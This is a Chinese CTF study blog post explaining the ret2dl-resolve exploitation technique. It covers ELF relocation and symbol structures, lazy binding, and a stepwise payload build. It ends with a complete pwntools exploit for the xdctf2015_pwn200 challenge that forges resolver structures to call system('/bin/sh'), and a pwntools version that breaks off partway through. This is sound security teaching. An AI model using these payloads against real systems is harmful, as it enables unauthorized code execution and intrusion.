        <content type="html"><![CDATA[<p>最近在做一道题时,感觉很像ret2dl-resolve能解的,但是最后发现是自己太菜理念不清搞错解题方向ret2dl-resolve并不能解。所以写文重新温习下ret2dl-resolve,防止下次踩坑。<a id="more"></a></p><h2 id="ret2dl-resolve原理与使用条件"><a href="#ret2dl-resolve原理与使用条件" class="headerlink" title="ret2dl-resolve原理与使用条件"></a>ret2dl-resolve原理与使用条件</h2><p>ret2dl-resolve是不需要信息泄露，而是通过动态装载器来直接标识关键函数的位置并调用它们。由于ret2dl-resolve主要是针对延迟绑定来进行操作的，so它可以绕过多种包括专门为保护 ELF 数据结构不被破坏而设计的 RELRO 在内的安全缓解措施。但在依然有条件限制：</p><p>1.需要没有开启 Full RELRO 保护，换句话说要开启延迟绑定的机制，即库函数在第一次被调用时才将函数的真正地址填入 GOT 表以完成绑定。（这个是重要条件）</p><p>2.要有能被程序读取数据段上写入Elf_Sym 结构体的空间。</p><p>3.能恶意构造一个Elf_Sym 结构体。</p><h2 id="延迟绑定动态解析过程梳理"><a href="#延迟绑定动态解析过程梳理" class="headerlink" title="延迟绑定动态解析过程梳理"></a>延迟绑定动态解析过程梳理</h2><p>在一个存在延迟绑定机制程序中,库函数在第一次被调用时才将函数的真正地址填入 GOT 表以完成绑定。</p><p>这过程中牵扯到两个重要的结构体<code>Elf_Rel</code>与<code>Elf_Sym</code>.</p><p>重定位项使用 Elf_Rel 结构体来描述，存在于<code>.rep.plt</code> 段和 <code>.rel.dyn</code>段中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Word;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;       <span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;         <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int64_t</span>  Elf64_Sxword;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr    r_offset;       <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword   r_info;         <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword  r_addend;       <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure><p>32 位程序使用 REL，而 64 位程序使用 RELA。</p><p>其中<code>r_info</code>被宏定义为按如下方式解析和插入：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(val)        ((val) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(val)       ((val) &amp; 0xff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(sym, type)     (((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i)          ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i)         ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_INFO(sym,type)      ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure><p>而每个符号使用<code>Elf_Sym</code>结构体来描述，存在于<code>.dynsym</code>段和<code>.symtab</code>段中，而 <code>.symtab</code> 在<code>strip</code>之后会被删掉：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;        <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;       <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;        <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;        <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;       <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section st_shndx;       <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    st_name;        <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;        <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;       <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section st_shndx;       <span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr    st_value;       <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword   st_size;        <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>下面的宏描述了 st_info 是怎样被解析和插入的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* How to extract and insert information held in the st_info field.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_BIND(val)      (((unsigned char) (val)) &gt;&gt; 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_TYPE(val)      ((val) &amp; 0xf)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_INFO(bind, type)   (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_BIND(val)      ELF32_ST_BIND (val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_TYPE(val)      ELF32_ST_TYPE (val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_INFO(bind, type)   ELF32_ST_INFO ((bind), (type))</span></span><br></pre></td></tr></table></figure><p>当一个库函数被第一次调用时，具体动态解析过程的步骤为：</p><p>导入函数的<code>reloc_index</code>标识(一个<code>ELF_Rel</code>在 <code>.rel.plt</code>中的偏移)入栈。</p><p>然后跳转到<code>.plt</code> 段的开头,即 PLT[0]。PLT[0] 处的代码将 GOT[1] 的值压入栈中，然后跳转到 GOT[2]。 GOT[1]与GOT[2]这两个 GOT 表条目有着特殊的含义。</p><p>​    GOT[1]：一个指向内部数据结构的指针，类型是 <code>link_map</code>，在动态装载器内部使用，包含了进行符号解析需要的当前 ELF 对象的信息。在它的<code>l_info</code> 域中保存了<code>.dynamic</code> 段中大多数条目的指针构成的一个数组。</p><p>​    GOT[2]：一个指向动态装载器中 <code>_dl_runtime_resolve</code> 函数的指针。</p><p>所以这步，PLT[0] 其实就是调用<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code></p><p><code>_dl_runtime_resolve</code>函数使用参数<code>link_map_obj</code>来获取解析导入函数（使用<code>reloc_index</code>参数标识）需要的信息，并将结果写到正确的 GOT 条目中。在 <code>_dl_runtime_resolve</code>解析完成后，控制流就交到了那个函数手里，而下次再调用函数的 plt 时，就会直接进入目标函数中执行。过程如下图：</p><p><img src="image-20210523114312781.png" alt="image-20210523114312781"></p><h2 id="ret2dl-resolve利用点"><a href="#ret2dl-resolve利用点" class="headerlink" title="ret2dl-resolve利用点"></a>ret2dl-resolve利用点</h2><p>ret2dl-resolve利用点主要有两个地方。</p><p>a：因为动态转载器是从<code>.dynamic</code>段的 <code>DT_STRTAB</code>条目中获得<code>.dynstr</code>段的地址的，而 <code>DT_STRTAB</code>条目的位置已知，默认情况下也可写。所以攻击者能够改写<code>DT_STRTAB</code>条目的内容，欺骗动态装载器，让它以为 <code>.dynstr</code>段在 <code>.bss</code>段中，并在那里伪造一个假的字符串表。当它尝试解析<code>printf</code> 时会使用不同的基地址来寻找函数名，最终执行的是<code>execve</code>。这种方式非常简单，但仅当二进制程序的<strong><code>.dynamic</code>段可写*</strong>时有效。</p><p>b：我们已经知道 <code>_dl_runtime_resolve</code> 的第二个参数是<code>Elf_Rel</code>条目在 <code>.rel.plt</code>段中的偏移，动态装载器将这个值加上<code>.rel.plt</code> 的基址来得到目标结构体的绝对位置。然后当传递给<code>_dl_runtime_resolve</code> 的参数 <code>reloc_index</code>超出了<code>.rel.plt</code> 段，并最终落在<code>.bss</code>段中时，攻击者可以在该位置伪造了一个<code>Elf_Rel</code>结构，并填写<code>r_offset</code>的值为一个可写的内存地址来将解析后的函数地址写在那里，同理<code>r_info</code>也会是一个将动态装载器导向到攻击者控制内存的下标。这个下标就指向一个位于它后面的 <code>Elf_Sym</code> 结构，而 <code>Elf_Sym</code>结构中的 <code>st_name</code>同样超出了 <code>.dynsym</code>段。这样这个符号就会包含一个相对于<code>.dynstr</code>地址足够大的偏移使其能够达到这个符号之后的一段内存，而那段内存里保存着这个将要调用的函数的名称。</p><p><img src="image-20210523115403901.png" alt="image-20210523115403901"></p><h2 id="手动-payload流程构造梳理"><a href="#手动-payload流程构造梳理" class="headerlink" title="手动 payload流程构造梳理"></a>手动 payload流程构造梳理</h2><p>以32位程序来梳理下过程：</p><p>第一步，对于正常函数而言我们调用动态连接的后write函数作payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">"AAAA"</span>     <span class="comment"># new ebp</span></span><br><span class="line">payload += p32(write_plt)</span><br><span class="line">payload += <span class="string">"AAAA"</span></span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(base_addr + <span class="number">80</span>)</span><br><span class="line">payload += p32(len(<span class="string">"/bin/sh"</span>))</span><br><span class="line">payload += <span class="string">"A"</span> * (<span class="number">80</span> - len(payload_2))</span><br><span class="line">payload += <span class="string">"/bin/sh\x00"</span></span><br><span class="line">payload += <span class="string">"A"</span> * (<span class="number">100</span> - len(payload_2))</span><br></pre></td></tr></table></figure><p>第二步，我们伪造<code>write@plt</code>，及入栈<code>reloc_index</code>和跳转PLT[0]，那么payload改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">"/bin/sh"</span></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br></pre></td></tr></table></figure><p>第三步，伪造一个 write 函数的 <code>Elf_Rel</code>结构体。</p><p>其中设置<code>r_offset</code>为<code>write@got</code>，标函数解析后的内存地址存放到该位置。</p><p><code>r_info</code>用<code>readelf -r ./bof | grep write</code>查找后照搬。动态加载器会根据这个值找到对应的<code>Elf_Sym</code></p><p><code>reloc_index</code>要调整为我们伪造 <code>Elf_Rel</code>结构体相对<code>.rel.plt</code>的偏移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">r_info = <span class="number">0x607</span> <span class="comment"># write: Elf32_Rel-&gt;r_info</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br></pre></td></tr></table></figure><p>第四步，伪造一个 write 函数的 <code>Elf_Sym</code>结构体。</p><p>用<code>readelf -s ./bof | grep write</code> 然然后用objdump来找st_name与st_info</p><p><img src="image-20210523130030115.png" alt="image-20210523130030115"></p><p>同时，<code>Elf_Rel</code>结构体也要改变r_info可以通过<code>r_sym</code>和<code>r_type</code>计算。</p><p><code>r_sym</code>又是<code>Elf_Sym</code>相对<code>.dynsym</code>的偏移，<code>r_type</code>照搬<code>R_386_JUMP_SLOT</code>的值为0x7</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span> <span class="comment">#</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_sym=index_dynsym &lt;&lt; <span class="number">8</span></span><br><span class="line">r_type=<span class="number">0x7</span></span><br><span class="line">r_info = (r_sym) | r_type</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = <span class="number">0x4c</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">r.sendline(payload2)</span><br></pre></td></tr></table></figure><p>第五步，伪造<code>.bss</code> 上伪造<code>.dynstr</code>,放入伪造函数名<code>write</code>。相应调整st_name指向的伪造函数名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_sym=index_dynsym &lt;&lt; <span class="number">8</span></span><br><span class="line">r_type=<span class="number">0x7</span></span><br><span class="line">r_info = (r_sym) | r_type</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">16</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">"write\x00"</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br></pre></td></tr></table></figure><p>最后改’write’为system.</p><h2 id="例题：xdctf2015-pwn200"><a href="#例题：xdctf2015-pwn200" class="headerlink" title="例题：xdctf2015_pwn200"></a>例题：xdctf2015_pwn200</h2><p>按之前手动的分析，完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment"># ROPgadget --binary bof --only "pop|ret"</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># ROPgadget --binary bof --only "leave|ret"</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S bof | grep ".bss"</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'bof'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">16</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">"system\x00"</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>同时，我们还可以通过pwntools 的Ret2dlresolvePayload来自动完成需要手动的伪造步骤：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">"./bof"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./bof"</span>) </span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="string">"system"</span>, args=[<span class="string">"/bin/sh"</span>]) </span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr) </span><br><span 